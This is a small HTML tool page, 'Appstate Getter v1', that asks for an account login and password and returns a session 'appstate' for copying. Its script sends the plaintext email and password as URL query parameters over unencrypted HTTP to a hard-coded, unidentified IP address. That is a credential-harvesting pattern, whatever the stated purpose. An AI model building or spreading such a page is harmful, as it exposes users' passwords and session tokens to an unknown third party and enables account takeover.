<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <title>Appstate Getter v1</title>
   <style>
      body {
         font-family: Arial, sans-serif;
         margin: 0;
         padding: 0;
         background-color: #f0f0f0;
      }
      .container {
         max-width: 600px;
         margin: 20px auto;
         padding: 20px;
         background: #fff;
         border-radius: 8px;
         box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         text-align: center;
      }
      input {
         width: calc(100% - 22px);
         padding: 10px;
         margin: 10px 0;
         border: 1px solid #ccc;
         border-radius: 4px;
      }
      button {
         padding: 10px 20px;
         border: none;
         border-radius: 4px;
         background-color: #28a745;
         color: white;
         cursor: pointer;
         font-size: 16px;
      }
      button:hover {
         background-color: #218838;
      }
      .message {
         margin-top: 20px;
         font-size: 14px;
         color: red;
      }
      .appstate {
         margin-top: 20px;
         padding: 10px;
         border: 1px solid #ccc;
         border-radius: 4px;
         background-color: #e9ecef;
         word-wrap: break-word;
         white-space: pre-wrap;
         text-align: left;
         max-height: 300px;
         overflow-y: auto;
      }
      .copy-button {
         margin-top: 10px;
         background-color: #007bff;
      }
      .copy-button:hover {
         background-color: #0056b3;
      }
   </style>
</head>
<body>
   <div class="container">
      <h1>Appstate Getter v1</h1>
      <h2>By: CJ Villabits</h2>
      <input type="email" id="email" placeholder="Enter your Email/Uid/Number...">
      <br>
      <input type="password" id="password" placeholder="Enter Your Password...">
      <button onclick="showPass()">Show Password</button>
      <br>
      <br>
      <button onclick="getAppstate()">Get</button>
      <div class="message" id="message"></div>
      <div class="appstate" id="appstate-result"></div>
      <button class="copy-button" onclick="copyToClipboard()" style="display: none;">Copy to Clipboard</button>
   </div>
   <script>
      function showPass() {
         const passwordField = document.getElementById('password');
         if (passwordField.type === 'password') {
            passwordField.type = 'text';
         } else {
            passwordField.type = 'password';
         }
      }

      async function getAppstate() {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const messageDiv = document.getElementById('message');
         const appstateDiv = document.getElementById('appstate-result');
         const copyButton = document.querySelector('.copy-button');

         if (!email || !password) {
            messageDiv.textContent = 'Please fill in both email and password fields.';
            return;
         }

         messageDiv.textContent = 'Fetching appstate...';
         appstateDiv.textContent = '';
         copyButton.style.display = 'none';

         try {
            const response = await fetch(`http://94.130.129.40:8370/api/appstate?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
            const data = await response.json();

            if (response.ok) {
               messageDiv.style.color = 'green';
               messageDiv.textContent = 'Appstate fetched successfully.';
               appstateDiv.textContent = JSON.stringify(data, null, 2);
               copyButton.style.display = 'inline-block';
            } else {
               messageDiv.style.color = 'red';
               messageDiv.textContent = `Error: ${data.message || 'Failed to fetch appstate'}`;
            }
         } catch (error) {
            messageDiv.style.color = 'red';
            messageDiv.textContent = `Error: ${error.message || 'Failed to fetch appstate'}`;
         }
      }

      function copyToClipboard() {
         const appstateDiv = document.getElementById('appstate-result');
         const textArea = document.createElement('textarea');
         textArea.value = appstateDiv.textContent;
         document.body.appendChild(textArea);
         textArea.select();
         document.execCommand('copy');
         document.body.removeChild(textArea);
         alert('Appstate copied to clipboard');
      }
   </script>
</body>
</html>
